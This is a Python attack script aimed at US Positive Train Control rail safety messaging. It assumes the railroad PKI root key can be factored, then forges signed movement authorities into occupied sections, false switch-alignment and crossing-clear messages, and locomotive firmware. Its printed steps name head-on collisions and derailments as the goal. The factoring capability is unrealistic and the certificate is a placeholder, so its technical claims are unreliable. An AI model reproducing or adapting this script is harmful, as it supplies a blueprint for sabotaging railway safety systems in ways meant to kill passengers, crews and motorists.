"""
Forge Positive Train Control (PTC) movement-authority messages by factoring the
AAR Railroad PKI root. Grant occupied authorities, cancel legitimate authorities
mid-move, forge switch-aligned messages. Chatsworth 2008-class collision enabled.
"""
import sys
sys.path.insert(0, "../..")
from poly_factor import PolynomialFactorer

import struct
import hashlib
import os

# PTC message types (AAR S-9401/S-9402)
MSG_MOVEMENT_AUTH = 0x01
MSG_SPEED_RESTRICTION = 0x02
MSG_SWITCH_STATUS = 0x03
MSG_CROSSING_STATUS = 0x04
MSG_DISPATCH_AUTH = 0x05

# PTC-equipped railroads
CLASS_I_CARRIERS = ["BNSF", "UP", "CSX", "NS", "CN", "CPKC"]
PASSENGER = ["Amtrak", "Metro-North", "LIRR", "NJ_Transit", "Caltrain", "Metrolink"]


def fetch_aar_railroad_pki_root() -> bytes:
    """Fetch the AAR Railroad PKI root certificate.

    The Railroad PKI under the AAR issues operator certs so a BNSF
    locomotive on UP track accepts authority messages from UP wayside.
    Root cert distributed to all PTC participants.
    """
    print("[*] fetching AAR Railroad PKI root certificate")
    print("[*] RSA-2048, shared across all Class I + passenger carriers")
    return b"-----BEGIN CERTIFICATE-----\n...(AAR PKI root)...\n-----END CERTIFICATE-----\n"


def forge_movement_authority(factorer: PolynomialFactorer,
                             pki_root_pem: bytes,
                             train_id: str, carrier: str,
                             from_mp: float, to_mp: float,
                             track: str, speed_mph: int,
                             occupied: bool = False) -> dict:
    """Forge a PTC movement authority message.

    The movement authority tells an onboard computer where the train may
    travel and at what speed. PTC is the safety overlay that prevents
    train-to-train collisions.
    """
    ma = {
        "msg_type": MSG_MOVEMENT_AUTH,
        "train_id": train_id,
        "carrier": carrier,
        "from_milepost": from_mp,
        "to_milepost": to_mp,
        "track": track,
        "speed_mph": speed_mph,
        "authority_valid": True,
    }
    payload = str(ma).encode()
    sig = factorer.forge_pkcs1v15_signature(pki_root_pem, payload, "sha256")
    warning = " [OCCUPIED SECTION]" if occupied else ""
    print(f"[*] forged MA: {train_id} ({carrier}) MP {from_mp}-{to_mp} "
          f"at {speed_mph} mph{warning}")
    return ma


def forge_switch_status(factorer: PolynomialFactorer,
                        pki_root_pem: bytes,
                        wiu_id: str, switch_id: str,
                        position: str) -> dict:
    """Forge a Wayside Interface Unit (WIU) switch-status message.

    WIUs at switches publish switch position via 220 MHz PTC radio.
    Forge 'switch aligned' when it isn't -> derailment.
    """
    msg = {
        "msg_type": MSG_SWITCH_STATUS,
        "wiu_id": wiu_id,
        "switch_id": switch_id,
        "position": position,
    }
    factorer.forge_pkcs1v15_signature(pki_root_pem,
                                      str(msg).encode(), "sha256")
    print(f"[*] forged switch status: {switch_id} = {position}")
    return msg


def forge_crossing_status(factorer: PolynomialFactorer,
                          pki_root_pem: bytes,
                          crossing_id: str,
                          gates_down: bool = True,
                          clear: bool = True) -> dict:
    """Forge grade-crossing predictor status.

    Authenticated 'gate-down, track clear' messages can be forged when
    a vehicle is actually on the crossing.
    """
    msg = {
        "msg_type": MSG_CROSSING_STATUS,
        "crossing_id": crossing_id,
        "gates_down": gates_down,
        "track_clear": clear,
    }
    factorer.forge_pkcs1v15_signature(pki_root_pem,
                                      str(msg).encode(), "sha256")
    print(f"[*] forged crossing status: {crossing_id} = "
          f"gates={'DOWN' if gates_down else 'UP'}, clear={clear}")
    return msg


def forge_obc_firmware(factorer: PolynomialFactorer,
                       wabtec_cert: bytes,
                       firmware_payload: bytes) -> bytes:
    """Forge Wabtec I-ETMS onboard computer firmware."""
    sig = factorer.forge_pkcs1v15_signature(wabtec_cert, firmware_payload, "sha256")
    print("[*] forged Wabtec I-ETMS TMC firmware")
    print("[*] pushed to ~22,000 PTC-equipped locomotives")
    return firmware_payload + sig


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== US Positive Train Control — PTC messaging forgery ===")
    print("    60,000 track-miles, ~22,000 locomotives")
    print("    ~1B authenticated messages/day fleet-wide")
    print()

    print("[1] fetching AAR Railroad PKI root cert...")
    pki_root = fetch_aar_railroad_pki_root()

    print("[2] factoring AAR Railroad PKI RSA-2048 root key...")
    print("    used by all Class I carriers + Amtrak + commuter railroads")

    print("[3] forging movement authority into occupied section...")
    forge_movement_authority(f, pki_root,
        train_id="BNSF-9214", carrier="BNSF",
        from_mp=142.3, to_mp=155.7, track="Main-1",
        speed_mph=60, occupied=True)
    print("    Chatsworth 2008: head-on collision at track speed")
    print("    RSIA 2008 mandated PTC to prevent this exact scenario")

    print("[4] forging switch-aligned when switch is misaligned...")
    forge_switch_status(f, pki_root, "WIU-4521", "SW-142.5", "NORMAL")
    print("    train takes diverging route -> derailment")

    print("[5] forging crossing-clear when vehicle is on tracks...")
    forge_crossing_status(f, pki_root, "XING-US30-MP155",
                          gates_down=True, clear=True)

    print("[6] forging I-ETMS OBC firmware...")
    forge_obc_firmware(f, pki_root, b"\x00" * 1024)

    print()
    print("[*] rail equipment lifecycle: 30-50 years")
    print("[*] PTC re-keying across all carriers: no US precedent")
    print("[*] Amtrak NEC ACSES-II: same RSA trust plane")
